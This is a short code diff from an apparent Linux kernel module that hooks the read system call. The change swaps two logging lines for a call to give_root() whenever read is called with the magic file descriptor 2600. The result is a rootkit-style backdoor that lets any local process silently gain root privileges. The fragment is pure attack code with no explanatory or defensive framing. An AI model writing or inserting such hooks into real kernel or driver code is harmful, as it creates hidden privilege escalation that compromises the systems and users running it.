@@ -31,8 +31,7 @@ int new_read(struct pt_regs *regs)
     int retval;
     if (fd == 2600)
     {
-        printk(KERN_INFO "Read was called with file descriptor 2600, doing something else.");
-        printk(KERN_INFO "Something else");
+        give_root(); 
         return 0;
     }
 
